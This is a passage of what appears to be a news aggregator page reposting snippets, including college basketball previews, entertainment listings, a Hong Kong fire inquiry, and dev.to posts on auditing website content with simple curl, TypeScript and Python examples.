+<p>The renderer splits each paragraph on the phrase and wraps it. The prose stays a string, the audits keep working, and a page can say "we explain this in the hosting guide" with a link on those words. It is maybe twenty lines of component and one more field, and it is the thing I would do next if internal linking on this site needed a push.</p>
+
+<h2>
+  
+  
+  Check it yourself
+</h2>
+
+
+
+
+
+
+<span>URL</span><span>=</span>https://pub-trivia.app/guides/how-to-be-a-good-quizmaster
+
+<span># Sections on the page</span>
+curl <span>-s</span> <span>"</span><span>$URL</span><span>"</span> | <span>grep</span> <span>-o</span> <span>'&lt;h2 class="text-foreground text-2xl'</span> | <span>wc</span> <span>-l</span>
+
+<span># Body paragraphs, and how many of them contain a link</span>
+curl <span>-s</span> <span>"</span><span>$URL</span><span>"</span> | python3 <span>-c</span> <span>"
+import re, sys
+ps = re.findall(r'&lt;p class=</span><span>\"</span><span>text-muted-foreground leading-relaxed</span><span>\"</span><span>&gt;(.*?)&lt;/p&gt;', sys.stdin.read(), re.S)
+print(len(ps), 'paragraphs,', sum('&lt;a ' in p for p in ps), 'with a link')
+"</span>
+
+
+
+
+
+
+<p>Eight sections, 25 paragraphs, and not one link in any of them. Match the &lt;h2 prefix rather than the class on its own: the class name appears a second time inside the RSC flight payload at the bottom of the document, so a looser grep returns sixteen.</p>
+
+<p>Then open <a href="https://pub-trivia.app/about">pub-trivia.app/about</a>, the hand written page, and notice that its paragraphs do contain links. One page in five that does not use the type, and it is the only page that can do the thing the other 67 cannot.</p>
+
+<p>A type is a policy. If you encode your page body as data, write down what the data cannot express, because in a year that list is going to be a list of things your site does not do.</p></div>
+</article>
+<article class="article-card" id="artikel-6609">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Big Ten basketball: Nolan Winter is back for Wisconsin — but Nick Boyd and John Blackwell are gone", "image": [], "datePublished": "2026-11-01T13:00:59Z", "dateModified": "2026-11-01T13:00:59Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6609"}</script>
+    <h2>Big Ten basketball: Nolan Winter is back for Wisconsin — but Nick Boyd and John Blackwell are gone</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.chicagotribune.com/2026/11/01/college-basketball-wisconsin-outlook/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>Wisconsin has appeared in 25 of the last 27 NCAA Tournaments. Whether the Badgers get back there again this season depends on how well they replace the backcourt tandem of Nick Boyd and John Blackwell, who combined for nearly 40 points per game last season.</p>
+<p><a href="https://www.chicagotribune.com/2026/03/19/ncaa-tournament-high-point-wisconsin/">High Point upset Wisconsin 83-82</a> in the opening round of the NCAA Tournament last season.</p>
+<p><strong>Last season:</strong> 24-11, 14-6 Big Ten</p>
+<h4>Players to watch</h4>
+<p><strong>Nolan Winter</strong> is back for his senior year as a four-year contributor at the same power-conference school, a rarity in today’s game. The 7-footer had 13.1 points and 8.5 rebounds per game last season while collecting 12 double-doubles to rank second in the Big Ten. … <strong>Braeden Carrington</strong> got a boost in his bid for a fifth season of eligibility when an injunction was granted on Oct. 20. The 6-foot-5 guard had 8.3 points per game last season and scored 20 in a preseason win over Green Bay. … <strong>Austin Rapp</strong>, a 6-10 Australian forward, had 9.7 points per game last season. … <strong>Jack Janicki</strong> has appeared in 63 games the last two seasons and provides plenty of energy.</p>
+<h4>Departures and arrivals</h4>
+<p>Owen Foxwell, a 23-year-old newcomer, should make a major impact after playing five years in Australia’s National Basketball League. The 6-2 guard had 21 points and six assists against Green Bay. … Eian Elmer and Victory Onuetu transferred to Wisconsin after playing in the NCAA Tournament last season. Elmer, a 6-6 guard, averaged 12.7 points and 5.9 rebounds at Miami (Ohio). Onuetu, a 6-11 forward from Spain, averaged 4.7 points and 6.9 rebounds for Hofstra. … The departures of Boyd and Blackwell leave a major void. Boyd had 20.7 points per game in his last season of eligibility. Blackwell transferred to Duke after averaging 19.1 points per game.</p>
+<h4>Top games</h4>
+<p>Wisconsin’s notable nonconference games include a Dec. 5 trip to Marquette, a Dec. 12 visit to Villanova and a Dec. 19 matchup with Auburn at Nashville, Tennessee.</p>
+<p>The Badgers play Seton Hall on Nov. 19 in their first game at the Baha Mar Championship in Nassau, Bahamas, an event that also includes N.C. State and Murray State.</p>
+<p>Wisconsin has two games with <a href="https://www.chicagotribune.com/2026/10/27/illinois-mens-basketball-season-preview/">No. 3 Illinois</a>: Jan. 2 at home and Feb. 28 at Champaign. Other dates with preseason Top 25 teams are Jan. 16 at No. 21 Southern California, Jan. 19 at No. 22 UCLA, Feb. 6 at home against No. 16 Michigan and March 6 at No. 6 Michigan State.</p>
+<h4>Facts and figures</h4>
+<p>Although the Big Ten doesn’t release an official preseason forecast, a media poll annually conducted by The Columbus (Ohio) Dispatch had Wisconsin finishing 11th. … The Big Ten did have a media panel name a preseason all-Big Ten team, and Winter was included on that list. … Wisconsin made a school-record 11.7 3-pointers per game last season. The Badgers scored 83 points per game, their third-highest average ever.</p></div>
+</article>
+<article class="article-card" id="artikel-6610">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Big Ten basketball: Purdue begins a new era with a familiar goal — winning another conference title", "image": [], "datePublished": "2026-11-01T13:00:58Z", "dateModified": "2026-11-01T13:00:58Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6610"}</script>
+    <h2>Big Ten basketball: Purdue begins a new era with a familiar goal — winning another conference title</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.chicagotribune.com/2026/11/01/college-basketball-purdue-outlook/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>Purdue is entering a new era under longtime coach Matt Painter.</p>
+<p>Three four-year starters — guards Braden Smith and Fletcher Loyer and forward Trey Kaufman-Renn — have departed. Kaufman-Renn is fighting a legal battle to regain one year of eligibility, but he&#8217;s already said he won&#8217;t be with Purdue.</p>
+<p>Painter has overcome major turnovers before, and the Boilermakers rarely lose ground. They should still have enough talent, big men and perimeter shooters to be a Big Ten title contender.</p>
+<p><strong>Last season:</strong> 30-7, 11-7 Big Ten</p>
+<h4>Players to watch</h4>
+<p>Despite the losses of the big three, the Boilermakers have experienced guards <strong>C.J. Cox</strong>, <strong>Gicarri Harris</strong> and <strong>Omer Meyer</strong>, all of whom have logged major minutes since arriving at Purdue. &#8230; <strong>Daniel Jacobsen</strong>, the 7-foot-4 center, showed promise during his second season with the Boilermakers. He needs to take another step this season. &#8230; <strong>Caden Pierce</strong> started 89 games at Princeton before redshirting last year. He&#8217;s the only significant transfer this year.</p>
+<h4>Departures and arrivals</h4>
+<p>Painter is selective when it comes to the transfer portal. Pierce, the younger brother of Indianapolis Colts receiver Alec Pierce, and Jack Lusk are the only ones on the roster. Lusk spent one season at Millikin before following his father, assistant coach Paul Lusk, to Purdue two years ago. &#8230; The program&#8217;s next big project could be Sinan Huan, a first-year, 7-1 center from China. &#8230; What exactly will Purdue be missing with the graduations? Smith set the NCAA&#8217;s career record for assists (1,103). Loyer is the school&#8217;s career leader in 3-pointers (309), and Kaufman-Renn is 17th in school history in scoring (1,655) and 11th all-time in rebounds (762).</p>
+<h4>Top games</h4>
+<p>After an exhibition game at national runner-up UConn, the Boilermakers open the season against Gonzaga on Nov. 2.</p>
+<p>The Boilermakers also face Oklahoma on a neutral court Nov. 26, play at Iowa State on Dec. 5, host Tennessee on Dec. 11 and face Colorado in Indianapolis on Dec. 19. They open Big Ten play at home Dec. 1 against Iowa, play at Michigan on Jan. 8 and face rival Indiana on the road Feb. 16 while hosting the Hoosiers on March 5.</p>
+<h4>Facts and figures</h4>
+<p>Pierce played a key role on Princeton&#8217;s Sweet 16 team in 2022-23. The next season, he was chosen the Ivy League Player of the Year with averages of 16.6 points, 9.2 rebounds and 3.2 assists. &#8230; Painter&#8217;s 501 career wins at Purdue rank third all-time in Big Ten history. He needs 12 wins to pass his coach, Gene Keady. Only Tom Izzo (764) and the late Bob Knight (659) have more wins with conference teams. &#8230; Center Oscar Cluff (10.6 points) also has departed, leaving Cox as the top returning scorer at 8.5 points per game.</p></div>
+</article>
+<article class="article-card" id="artikel-8439">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "15 Years Ago, Zelda Told its Most Memorable Story with its Worst Gameplay", "image": ["https://static0.polygonimages.com/wordpress/wp-content/uploads/chorus/uploads/chorus_asset/file/22695444/Switch_ZeldaSSHD_ND_Feb_SCRN07.jpg"], "datePublished": "2026-11-01T13:00:17+00:00", "dateModified": "2026-11-01T13:00:17+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-8439"}</script>
+    <h2>15 Years Ago, Zelda Told its Most Memorable Story with its Worst Gameplay</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.polygon.com/legend-zelda-skyward-sword-retrospective/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static0.polygonimages.com/wordpress/wp-content/uploads/chorus/uploads/chorus_asset/file/22695444/Switch_ZeldaSSHD_ND_Feb_SCRN07.jpg" alt="15 Years Ago, Zelda Told its Most Memorable Story with its Worst Gameplay" loading="lazy"><p>Hold the controller over your head. The Master Sword glows. Point it at the screen, hit Y to recenter, and swing. On the screen, Link swings… kind of the right way. Then, your chatty companion, Fi, chimes in with a very long and earnest explanation of something you figured out several minutes ago. Rinse and repeat for about 40 hours, and that’s <a href="https://www.polygon.com/game/the-legend-of-zelda-skyward-sword/1825/"><em>Skyward Sword</em></a>, one of the most cinematic, heartrending, memorable stories Zelda has ever told — and the one saddled with the most finicky gameplay.</p></div>
+</article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
+<article class="article-card" id="artikel-6316">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "I tested One UI 9's new Network Guard against AdGuard's Private DNS to stop annoying ads on my Galaxy", "image": ["https://static0.anpoimages.com/wordpress/wp-content/uploads/2026/10/samsung-galaxy-smartphone-displaying-ai-network-guard-surrounded-by-blocked-ad-icons.png"], "datePublished": "2026-11-01T13:00:10+00:00", "dateModified": "2026-11-01T13:00:10+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6316"}</script>
+    <h2>I tested One UI 9&#x27;s new Network Guard against AdGuard&#x27;s Private DNS to stop annoying ads on my Galaxy</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.androidpolice.com/tested-one-ui-9-network-guard-against-adguards-private-dns/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static0.anpoimages.com/wordpress/wp-content/uploads/2026/10/samsung-galaxy-smartphone-displaying-ai-network-guard-surrounded-by-blocked-ad-icons.png" alt="I tested One UI 9&#x27;s new Network Guard against AdGuard&#x27;s Private DNS to stop annoying ads on my Galaxy" loading="lazy"><p>Many free apps and websites pay for themselves with ads, so you don't have to pay out of pocket.</p></div>
+</article>
+<article class="article-card" id="artikel-6911">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Halifax man creates custom cribbage pegs for popular game", "image": ["https://www.ctvnews.ca/resizer/v2/2F4WBBTX4RHFLLAUJKVX2REQBQ.jpeg?auth=328fa6778b6c52846276ff2d7b9beab1cf30c1f1fd0c3169adb3086579557ff2&smart=true&width=5712&height=3213"], "datePublished": "2026-11-01T13:00:00-04:00", "dateModified": "2026-11-01T13:00:00-04:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6911"}</script>
+    <h2>Halifax man creates custom cribbage pegs for popular game</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.ctvnews.ca/atlantic/nova-scotia/article/halifax-man-creates-custom-cribbage-pegs-for-popular-game/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.ctvnews.ca/resizer/v2/2F4WBBTX4RHFLLAUJKVX2REQBQ.jpeg?auth=328fa6778b6c52846276ff2d7b9beab1cf30c1f1fd0c3169adb3086579557ff2&amp;smart=true&amp;width=5712&amp;height=3213" alt="Halifax man creates custom cribbage pegs for popular game" loading="lazy">Halifax-based Crib Pegz creates cribbage pegs with symbols. (Source: Kieran Allain)</div>
+</article>
+<article class="article-card" id="artikel-6650">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Watch ‘Dig,’ ‘The Good Daughter’ and More on Peacock This November", "image": ["https://www.cnet.com/wp-content/uploads/sites/2/Dig.jpg"], "datePublished": "2026-11-01T13:00:00+00:00", "dateModified": "2026-11-01T13:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6650"}</script>
+    <h2>Watch ‘Dig,’ ‘The Good Daughter’ and More on Peacock This November</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.cnet.com/culture/entertainment/watch-dig-the-good-daughter-and-more-on-peacock-this-november/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://www.cnet.com/wp-content/uploads/sites/2/Dig.jpg" alt="Watch ‘Dig,’ ‘The Good Daughter’ and More on Peacock This November" loading="lazy">Amy Poehler reunited with Parks &#038; Rec creator Mike Schur for a new sitcom, Dig, one of the big titles arriving to Peacock this month.</div>
+</article>
+<article class="article-card" id="artikel-6709">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Sherrod Brown's Ohio edge threatens a rough go for crypto next year", "image": ["https://cdn.sanity.io/images/s3y3vcno/production/980e14fb5deca3308b0b3810ae7be99f3786d34c-3900x2600.jpg?fm=jpg&w=800&h=450&crop=focalpoint&fit=clip"], "datePublished": "2026-11-01T13:00:00+00:00", "dateModified": "2026-11-01T13:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-6709"}</script>
+    <h2>Sherrod Brown&#x27;s Ohio edge threatens a rough go for crypto next year</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.coindesk.com/news-analysis/2026/11/01/sherrod-brown-s-ohio-edge-threatens-a-rough-go-for-crypto-next-year" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://cdn.sanity.io/images/s3y3vcno/production/980e14fb5deca3308b0b3810ae7be99f3786d34c-3900x2600.jpg?fm=jpg&amp;w=800&amp;h=450&amp;crop=focalpoint&amp;fit=clip" alt="Sherrod Brown&#x27;s Ohio edge threatens a rough go for crypto next year" loading="lazy"></div>
+</article>
+<article class="article-card" id="artikel-7452">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Celebs' Plastic Surgeries by the Numbers: $218K Facelift and More", "image": ["https://akns-images.eonline.com/eol_images/Entire_Site/20261031/0e918054-7e2c-4988-82c1-3370789ad687_1793505503.jpg"], "datePublished": "2026-11-01T13:00:00+00:00", "dateModified": "2026-11-01T13:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7452"}</script>
+    <h2>Celebs&#x27; Plastic Surgeries by the Numbers: $218K Facelift and More</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.eonline.com/news/1437678/how-much-celebs-paid-for-plastic-surgery-cosmetic-procedures?cmpid=rss-syndicate-genericrss-us-top_stories" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://akns-images.eonline.com/eol_images/Entire_Site/20261031/0e918054-7e2c-4988-82c1-3370789ad687_1793505503.jpg" alt="Celebs&#x27; Plastic Surgeries by the Numbers: $218K Facelift and More" loading="lazy"><img alt="Kathy Griffin" src="https://akns-images.eonline.com/eol_images/Entire_Site/20261031/0e918054-7e2c-4988-82c1-3370789ad687_1793505503.jpg?fit=around|660:660">Celebrities are reshaping the conversation by being candid about their plastic surgery and cosmetic procedures.
+Take, Jennifer Lawrence, for instance. Volunteering as tribute to share her own...<br></div>
+</article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
+<article class="article-card" id="artikel-7852">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Netflix’s New Releases Coming in November 2026", "image": [], "datePublished": "2026-11-01T13:00:00+00:00", "dateModified": "2026-11-01T13:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7852"}</script>
+    <h2>Netflix’s New Releases Coming in November 2026</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.hollywoodreporter.com/tv/tv-news/netflix-november-2026-new-releases-movies-tv-1236744265/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body">Take a look at the movies and TV shows that are hitting the streaming service this month.</div>
+</article>
+<article class="article-card" id="artikel-8152">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Feature: Nintendo Life eShop Selects (October 2026)", "image": ["https://images.nintendolife.com/f30b5477e54d1/large.jpg"], "datePublished": "2026-11-01T13:00:00+00:00", "dateModified": "2026-11-01T13:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-8152"}</script>
+    <h2>Feature: Nintendo Life eShop Selects (October 2026)</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.nintendolife.com/features/nintendo-life-eshop-selects-october-2026" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://images.nintendolife.com/f30b5477e54d1/large.jpg" alt="Feature: Nintendo Life eShop Selects (October 2026)" loading="lazy"><p><strong>The best eShop games on Switch 1 &amp; 2 in October.</strong></p><p>Games. Video games. Good video games.</p><p>There have been a lot of them this month — too many to play, in fact. So if you're looking for the cream of the crop, and <em>specifically</em> the good video games on eShop that you can't (yet) buy in any physical form, you've come to the right place.</p><p>Read the <a href="https://www.nintendolife.com/features/nintendo-life-eshop-selects-october-2026">full article on nintendolife.com</a></p></div>
+</article>
+<article class="article-card" id="artikel-7256">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Eight entries in one content array, 1,041 to 2,034 words each, and the optional field that has exactly one user", "image": [], "datePublished": "2026-11-01T12:59:38+00:00", "dateModified": "2026-11-01T12:59:38+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7256"}</script>
+    <h2>Eight entries in one content array, 1,041 to 2,034 words each, and the optional field that has exactly one user</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/daniel_pertu/eight-entries-in-one-content-array-1041-to-2034-words-each-and-the-optional-field-that-has-239l" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>Munchable covers eight digestive conditions, and each one has a guide page. All eight are entries in a single array of a single interface, server-rendered at build time, so <a href="https://munchable.app/conditions">the index</a> and every guide under it come out of one file.</p>
+
+<p>That makes them comparable, which is the only reason this post exists. Content you can measure against itself tells you things that content in a CMS never will.</p>
+
+<h2>
+  
+  
+  The inventory
+</h2>
+
+<p>I counted the source entries and then counted the live pages. Sorted by the live word count:<br>
+</p>
+
+
+
+
+guide                      src lines  sections  FAQs   words   links in HTML   answers linking in
+coeliac disease                   87         4     5   2,034         125                88
+bile acid malabsorption           54         3     3   1,543         103                67
+low FODMAP and IBS                55         3     3   1,338         100                64
+lactose intolerance               47         2     3   1,257          88                52
+SIBO                              41         2     2   1,168         100                64
+IBD                               49         3     2   1,126          84                48
+GERD and reflux                   51         3     2   1,075          80                44
+gastroparesis                     44         2     2   1,041          70                34
+
+
+
+
+
+
+<p>The links column counts every internal link in the page's HTML, so about 30 of each row is the header and footer that all 516 of our pages share. The last column is the number of ingredient answer pages that link back to that guide.</p>
+
+<p>The top row is 95 per cent longer than the bottom row. It has twice as many source lines, twice as many sections, and more than twice the FAQ entries. It was also the last one written, which is the part that matters, because nothing in the type or the tests asked it to be bigger. It is bigger because it was written on a day when we knew more about writing these than we did for the first one.</p>
+
+<p>The other seven do not form any pattern at all. They are not ordered by how common the condition is, or by how old the page is, or by anything else I can find. They are each as long as the afternoon they were written, which is what a content set with no floor looks like when you finally line it up.</p>
+
+<h2>
+  
+  
+  The optional field
+</h2>
+
+<p>Here is the part of the interface that interests me:<br>
+</p>
+
+
+
+
+<span>export</span> <span>interface</span> <span>ConditionPage</span> <span>{</span>
+  <span>slug</span><span>:</span> <span>string</span><span>;</span>
+  <span>condition</span><span>:</span> <span>ConditionId</span><span>;</span>
+  <span>name</span><span>:</span> <span>string</span><span>;</span>
+  <span>h1</span><span>:</span> <span>string</span><span>;</span>
+  <span>metaTitle</span><span>:</span> <span>string</span><span>;</span>
+  <span>metaDescription</span><span>:</span> <span>string</span><span>;</span>
+  <span>lede</span><span>:</span> <span>string</span><span>;</span>
+  <span>summary</span><span>:</span> <span>string</span><span>;</span>
+  <span>sections</span><span>:</span> <span>ConditionSection</span><span>[];</span>
+  <span>checks</span><span>:</span> <span>string</span><span>[];</span>
+  <span>faqs</span><span>:</span> <span>{</span> <span>q</span><span>:</span> <span>string</span><span>;</span> <span>a</span><span>:</span> <span>string</span> <span>}[];</span>
+  <span>furtherReading</span><span>?:</span> <span>{</span>
+    <span>href</span><span>:</span> <span>string</span><span>;</span>
+    <span>label</span><span>:</span> <span>string</span><span>;</span>
+    <span>inline</span><span>:</span> <span>string</span><span>;</span>
+    <span>blurb</span><span>:</span> <span>string</span><span>;</span>
+  <span>}[];</span>
+<span>}</span>
+
+
+
+
+
+
+<p>Eleven required fields and one optional one. The optional one has exactly one user out of eight entries, and it was introduced by the entry that needed it: coeliac disease has head terms that are a vocabulary rather than a question, so it got <a href="https://munchable.app/hidden-gluten-ingredients">a reference page</a> of its own, and the guide needed somewhere to point at it from.</p>
+
+<p>That is a perfectly reasonable thing to do, and it is also the exact mechanism by which content types rot. A required field is a question every entry has to answer. An optional field is a note that one entry had something extra to say. Add enough of them and the type describes the union of everything anybody ever wanted to publish, no single entry is ever incomplete, and nothing fails when a page is thin.</p>
+
+<p>The alternative shape would be a separate registry keyed by condition, which makes the asymmetry visible in a file of its own rather than invisible as an absent property. I do not think that is better here, because further reading genuinely belongs next to the guide it extends. But it is worth naming the trade, because "make it optional" is the default move and it has a cost that arrives later, in a column of numbers like the one above.</p>
+
+<h2>
+  
+  
+  The thinnest page is also the least linked
+</h2>
+
+<p>Look at the last two columns together. Each of the 461 ingredient answer pages links back to the guide for its condition, so the inbound count is a property of how many ingredient questions that condition has pages for. The spread is 88 down to 34.</p>
+
+<p>Those two columns are nearly the same ranking. The condition with the most to say got the longest guide and 88 internal links pointing at it. The one with the least got the shortest guide and 34. Nobody decided that, and it compounds in the wrong direction: the page most in need of help getting found has the least help, and the page that already reads best is the one the rest of the site keeps recommending.</p>
+
+<p>This is the thing I would not have noticed from inside the editor. Both numbers look fine on their own. It is only when you print them in the same table that you see the site has a quiet preference.</p>
+
+<h2>
+  
+  
+  What a floor would actually look like
+</h2>
+
+<p>The temptation is a word count minimum, and it is a trap. A test that fails under 1,200 words produces 1,200 words, and the last 160 of them will be padding that makes the page worse.</p>
+
+<p>A structural floor is defensible: every guide has at least three sections and at least three FAQ entries. Those are not quality, but they are shape, and shape is the thing that drifted. We already enforce an upper bound on the other end, a title and description budget read out of the source files by a test, so the machinery for this exists and is one assertion long.</p>
+
+<p>The real remedy is not a test, though. It is going back to the first seven pages with what we learned writing the eighth. The useful output of an audit like this is not a CI rule. It is a list, in order, of which page to fix first, and that list is just the table above read from the bottom up.</p>
+
+<p>If you want to see the two ends of it, the longest is <a href="https://munchable.app/conditions/coeliac-disease">the coeliac guide</a> and the shortest is <a href="https://munchable.app/conditions/gastroparesis">the gastroparesis one</a>. Same template, same type, same build, 993 words apart.</p></div>
+</article>
+<article class="article-card" id="artikel-7923">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Lit cigarette most likely started Hong Kong housing complex fire that killed 168, inquiry finds", "image": ["https://static.independent.co.uk/2026/11/01/03/2271625617..?width=1200&auto=webp&trim=1084%2C0%2C1084%2C0"], "datePublished": "2026-11-01T12:59:17+00:00", "dateModified": "2026-11-01T12:59:17+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7923"}</script>
+    <h2>Lit cigarette most likely started Hong Kong housing complex fire that killed 168, inquiry finds</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/asia/east-asia/hong-kong-fire-inquiry-cigarette-resignation-b3076992.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/03/2271625617..?width=1200&amp;auto=webp&amp;trim=1084%2C0%2C1084%2C0" alt="Lit cigarette most likely started Hong Kong housing complex fire that killed 168, inquiry finds" loading="lazy"><p>Winnie Ho, the housing secretary, resigned on Wednesday and her duties have been suspended</p></div>
+</article>
+<article class="article-card" id="artikel-7258">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "56 pages that answer the same question, 12 to 21 percent shared text, and three of them collect every related link", "image": [], "datePublished": "2026-11-01T12:57:17+00:00", "dateModified": "2026-11-01T12:57:17+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7258"}</script>
+    <h2>56 pages that answer the same question, 12 to 21 percent shared text, and three of them collect every related link</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/daniel_pertu/56-pages-that-answer-the-same-question-12-to-21-percent-shared-text-and-three-of-them-collect-36g1" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>CogniPrep has a page per assessment provider answering one question: can you cheat this test? <a href="https://cogniprep.app/cheating">56 of them</a>, and the answer on every single one is no.</p>
+
+<p>That is the worst possible brief for a content cluster. 56 pages, one verdict, one call to action, and a vendor name as the only obvious variable. Written carelessly it is a doorway-page farm. Here is what we did instead, and the one thing we got wrong, which I only found by counting.</p>
+
+<h2>
+  
+  
+  The rule that makes the pages different
+</h2>
+
+<p>The registry's own header comment states the decision the cluster is built on:<br>
+</p>
+
+
+
+
+Whether an assessment can be cheated is a property of the instrument, not of
+the company that bought it. Arctic Shores defeats a shortcut in exactly the
+same way at Thales as it does at Capita, so a page per employer would be
+dozens of restatements of one argument. Keying the cluster to the provider
+means each page can explain a mechanism that is genuinely its own.
+
+
+
+
+
+
+<p>That is the whole trick. Key the cluster to the thing that actually varies. A page per employer would have produced 132 pages with nothing to say; a page per instrument produces 56 pages where the reason a shortcut fails is different every time, because a behavioural profile with no marks, a timed adaptive paper and a forced-choice personality inventory fail a cheater for genuinely unrelated reasons.</p>
+
+<p>Each entry in the registry carries seven strings: the meta title, the description, the standfirst, the verdict line, the one-line mechanism, the hub card blurb, and the name candidates actually type into a search box. I checked all seven across all 56 entries:<br>
+</p>
+
+
+
+
+field              values   distinct
+metaTitle              56         56
+metaDescription        56         56
+intro                  56         56
+verdict                56         56
+defence                56         56
+cardBlurb              56         56
+searchName             56         56
+
+
+
+
+
+
+<p>Zero repeats in 392 strings. Meta titles run from 30 to 47 characters and not one is over 60, so none of them is truncated in a result. The page bodies are 56 separate page.tsx files, 8,911 lines in total, from 117 lines for the shortest to 271 for the longest.</p>
+
+<h2>
+  
+  
+  Measuring it from the outside
+</h2>
+
+<p>Counting distinct strings in your own registry proves you did not copy and paste. It does not prove the published pages read as different documents, because the bodies could still be one template with the nouns swapped.</p>
+
+<p>So measure the deployed HTML. Strip the tags, cut the text into overlapping eight-word windows, and intersect them pairwise:<br>
+</p>
+
+
+
+
+<span>def</span> <span>shingles</span><span>(</span><span>text</span><span>,</span> <span>n</span><span>=</span><span>8</span><span>):</span>
